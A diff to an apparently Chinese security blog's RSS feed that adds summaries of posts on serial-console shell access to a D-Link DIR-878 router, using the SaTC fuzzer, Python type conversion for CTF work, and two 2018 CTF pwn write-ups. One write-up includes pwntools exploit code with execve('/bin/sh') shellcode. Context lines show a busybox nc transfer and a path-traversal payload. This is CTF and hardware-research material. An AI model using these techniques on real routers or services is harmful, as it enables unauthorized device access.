@@ -296,6 +296,30 @@ ip测试 这里直接使用的上面的exp，判断版本号后也无法成功�
     </item>
     
     <item>
+      <title>dlink dir-878通过串口获取shell</title>
+      <link>https://jellyfish-pro.github.io/note/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/note/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</guid>
+      <description>dlink dir-878通过串口获取shell 写在前面 焊针脚真的是一个体力活，不难，但是没有好的工具，实施起来就太麻烦了。
+文章只会介绍怎么找到GND和TX,然后通过排除法找到RX，而对于焊针脚不会详细描写。
+焊了针脚后其实也不能直接获得shell，还需要一些操作，这一部分会详细写。
+判断针脚 我的万用表的配置是这样的，因为我接触到iot设备的电流基本是3V，所以选择的是V而不是mV。
+然后黑线抵住wiki的卡扣，红线抵住针脚：
+通电后，挨个测试针脚，一般来说是0V的就是GND。
+然后重启路由器，测试剩下的三个针脚，如果有一个针脚在3V和1点几V左右来回跳动，那么说明这大概率是一个TX。
+那么剩下的VCC和RX，两个做排除法就好了。在实际dir-878中VCC是3V而RX是0.2V。
+获取shell 焊上针脚，找到GND和TX后我们就可以尝试连接串口了，dir-878的波特率为56000。
+进入串口，并且等待启动信息输出完毕，我们可以看到一个有着cmd&amp;gt;输入终端，这个终端可以输入任何字符，但是不会有回显：
+这里我们去搜索一下这个字符串：
+可以看到在如下的文件中出现可这个字符串，其实我们可以直接确定就在rc这个二进制文件中，因为这四个文件，只有rc和启动相关。
+通过cmd&amp;gt;我们可以直接找到交叉引用。通过这一段的逻辑，我们可以知道这里是在比较密码，而密码来自于console_pwd这个nvram环境变量。
+那我们直接搜索这个console_pwd这个字符串：
+这里找到一个类似的东西，我们可以去试一试这个dlink
+发现密码确实是这个东西</description>
+    </item>
+    
+    <item>
       <title>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）</title>
       <link>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -631,6 +655,25 @@ rm -rf ./bin/shsudo ln -s /bin/busybox sh 接着我们写一个后门文件：
     </item>
     
     <item>
+      <title>fuzz工具SaTC安装使用记录</title>
+      <link>https://jellyfish-pro.github.io/note/fuzz%E5%B7%A5%E5%85%B7satc%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/note/fuzz%E5%B7%A5%E5%85%B7satc%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
+      <description>fuzz工具SaTC安装使用记录 写在前面 最近在研究一些fuzz工具的使用，看能不能找一些0day出来。幻想着靠fuzz工具走上人生巅峰（雾）
+了解了两款fuzz工具，一款boofuzz，不过在安装的时候出了一些问题，在通过小道消息询问解决方案的时候，了解到了SaTC这个工具，发现两个工具是互补的，所以就先试了试SaTC。
+又因为SaTC使用的是docker，而我挺久没用docker了，所以来做点记录
+title: SaTC安装记录 toc: true authors: [] tags: [] categories: [] series: [] SaTC安装记录 SaTC这个很方便的一点是有中文README。
+在README中提到了两个安装方法：
+建议通过使用Dockerfile来构建系统环境:
+# 进入SaTC代码目录cd SaTC # 构建Docker镜像docker build . -t satc# 进入Dokcer环境, 自行添加目录映射docker run -it satc 如果因为网络等原因无法构建，可使用我们提供等docker image
+# 从docker hun拉去imagedocker pull smile0304/satc:V1.0# 进入Dokcer环境, 自行添加目录映射docker run -it smile0304/satc:V1.0 第一个使用Dockerfile的方式，在我的环境上安装失败，但并没有提示具体是什么错误。
+第二个方式就会方便许多，直接执行docker拉取命令就可以下载到本地。
+不过在启动Docker时，需要自己指定目录映射（或者通过docker命令将固件中的文件系统放进去）
+docker run --name satc-netgear -v /home/shangdi4sb/device/netgear:/home/satc/netgear -it smile0304/satc:V1.0 &amp;ndash;name ：是我给这个容器取的名字，因为这次尝试挖掘网件，就取名netgear -v ：指定的映射目录，冒号前面是本地目录，后门是docker里的目录 进入docker后，就可以看到共享的文件夹和Satc的文件夹</description>
+    </item>
+    
+    <item>
       <title>git连接远程仓库并添加密钥</title>
       <link>https://jellyfish-pro.github.io/note/git%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%AF%86%E9%92%A5/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -720,6 +763,26 @@ rw代表了可读可写。
 sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs 可以看到这个结构很简单，就不多解释了
 如果显示挂载失败可以尝试*-o*参数
 sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs -o nolcok </description>
+    </item>
+    
+    <item>
+      <title>python3中的数据类型转换</title>
+      <link>https://jellyfish-pro.github.io/note/python3%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/note/python3%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</guid>
+      <description>python3中的数据类型转换 写在前面
+之前在做ctf就涉及到泄露地址的情况，因为收到的一般是byte类型，但是如果要计算基地址的话就需要将byte转化为int类型。
+当时做转化就觉得很烦，随着后面接触的ctf的减少，就渐渐忘记了这件事。
+这次又遇到ctf，又在这个地方纠结了半天，所以这次做一个系统的总结。
+bytes转int 其实int主要分为两部分，一个是十进制，一个是十六进制。
+这里创建了一个6字节的bytes，来模拟接收到一个6字节的地址：
+byte = b&amp;#39;0x7f77bc08aef3&amp;#39; 接下来我们要对这个byte进行如下操作：
+将8个字节转为int类型，方便计算基地址 将int类型使用十六进制输出，来检查地址是否正确 最后使用p64()函数，进行包装，模拟发送回ctf 第一步 我们使用int()函数，但是需要注意该函数有两个参数，我们需要将base参数设置为16进制：
+addr = int(byte, base = 16)print(&amp;#34;byte_addr to int : %d&amp;#34;%addr) 第二步 因为addr已经变为int类型了，所以这里直接使用hex()就可以：
+hex_addr = hex(addr)print(&amp;#34;int_addr to hex : %s&amp;#34;%hex_addr) 第三步 这一步要使用p64()，但是我们要传入int类型。需要注意的是传入的是10进制，而不是16进制。
+p64_addr = p64(addr)print(b&amp;#34;p64() : &amp;#34; + p64_addr) 最后 看看效果：
+#!/usr/bin/python3from pwn import *byte = b&amp;#39;0x7f77bc08aef3&amp;#39;addr = int(byte, base = 16)print(&amp;#34;byte_addr to int : %d&amp;#34;%addr)hex_addr = hex(addr)print(&amp;#34;int_addr to hex : %s&amp;#34;%hex_addr)p64_addr = p64(addr)print(b&amp;#34;p64() : &amp;#34; + p64_addr) </description>
     </item>
     
     <item>
@@ -1240,6 +1303,46 @@ lang|s:52:&amp;#34;../../../../../../../../../../../../../../../../tmp/&amp;#34;
 随后在本地打开nc准备接受：
 nc -l port &amp;gt; your_file 在设备上使用命令：
 ./busybox nc ip port &amp;lt; your_file </description>
+    </item>
+    
+    <item>
+      <title>鹏城杯_2018_note</title>
+      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</guid>
+      <description>鹏城杯_2018_note 鹏城杯_2018_note
+写在前面： 目前的目标是强化分析漏洞点的能力，所以会重点书写漏洞的成因。
+题目分析 我们先静态分析二进制文件：
+其中，漏洞在于：
+这里nptr只有10个字节，但却可以往nptr所在的地址写入15个字节
+而根据上面栈的结构，就可以知道，这里多出来的5个字节就会覆盖到index的地址上，而index是用来寻找content地址的。
+我们点击进content：
+注意地址，是在bss段，我们往上拉就可以看到got表：
+这里地址相差了：
+也就意味着，我们如果可以将index覆盖成-64，我们就可以劫持got表中exit函数的地址
+这时我们就需要查看一下汇编：
+通过上面的注释，我们可以看到，如果想要将got表中的exit地址改为malloc函数分配的地址，我们需要将上面的-64除以8：
+所以我们只需要将index覆盖成为0xFFFFFFF8，就可以劫持got表的exit函数
+exp from pwn import *context(arch=&amp;#39;amd64&amp;#39;, os=&amp;#39;linux&amp;#39;, log_level=&amp;#39;debug&amp;#39;)file_name = &amp;#39;./2018_note&amp;#39;r = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 29319)elf = ELF(file_name)def dbg():gdb.attach(r)def add(index, size, content):r.sendline(&amp;#39;1&amp;#39;)sleep(0.1)r.sendline(str(index))sleep(0.1)r.sendline(size)sleep(0.1)r.sendline(content)p1 = asm(&amp;#39;&amp;#39;&amp;#39;mov rsi, 0x0068732f6e69622fjmp $+0x16&amp;#39;&amp;#39;&amp;#39;)p2 = asm(&amp;#39;&amp;#39;&amp;#39;push rsimov rdi, rspjmp $+0x1c&amp;#39;&amp;#39;&amp;#39;)p3 = asm(&amp;#39;&amp;#39;&amp;#39;xor rax, raxmov al, 0x3bjmp $+0x1b&amp;#39;&amp;#39;&amp;#39;)p4 = asm(&amp;#39;&amp;#39;&amp;#39;xor rsi, rsixor rdx, rdxsyscall&amp;#39;&amp;#39;&amp;#39;)add(0, b&amp;#39;13&amp;#39;.</description>
+    </item>
+    
+    <item>
+      <title>鹏城杯_2018_overint</title>
+      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</guid>
+      <description>鹏城杯_2018_overint 题目：鹏城杯_2018_overint
+写在前面： 目前阶段是想寻找并解决基础知识上的一些漏洞。所以文章的重点会放在理论和分析上，而对漏洞的利用则不会详细讲解。
+漏洞分析： 其实这道题的漏洞已经写在题目上了，是整数溢出。
+在题目中的体现便是：
+这里变量int_long已经远远大于4，但变量int_v12是一个有符号的整型。
+根据上图，有符号整型的正数部分最大到0x7fffffff。所以只要我们将int_v12+int_long的值大于0x7fffffff，那么计算机就会认为其为负数，从而使int_v12 &amp;gt; 4 为False
+题目流程分析 程序首先调用了这个qmencpy函数，创造了一个内存空间用来存放我们输入的字符。这一段空间很重要，因为后面的漏洞利用我们会用到这段空间。
+随后会让我们输入4个字符，并且将这个四个字符放入check_1函数进行检测：
+因为只需要返回35，所以我们直接写个脚本，跑一下就好了：
+#!/usr/bin/python3def check1():for i in range(100):for j in range(100):for k in range(100):for l in range(100):v3 = 0v3 = ((i &amp;gt;&amp;gt; 4) + 4 * v3) ^ (i &amp;lt;&amp;lt; 10)v3 = ((j &amp;gt;&amp;gt; 4) + 4 * v3) ^ (j &amp;lt;&amp;lt; 10)v3 = ((k &amp;gt;&amp;gt; 4) + 4 * v3) ^ (k &amp;lt;&amp;lt; 10)v3 = ((l &amp;gt;&amp;gt; 4) + 4 * v3) ^ (l &amp;lt;&amp;lt; 10)if v3 == 35 and i == 5:print(&amp;#39;[+] %d, %d, %d, %d&amp;#39; % (i, j, k, l))check1() 但需要注意的是，并不是所有的结果都可以使用。因为这个结果会和上面说到的int_long相加，故必须要大于0x5F9CCC8E(0x80000000-int_long)。</description>
     </item>
     
   </channel>
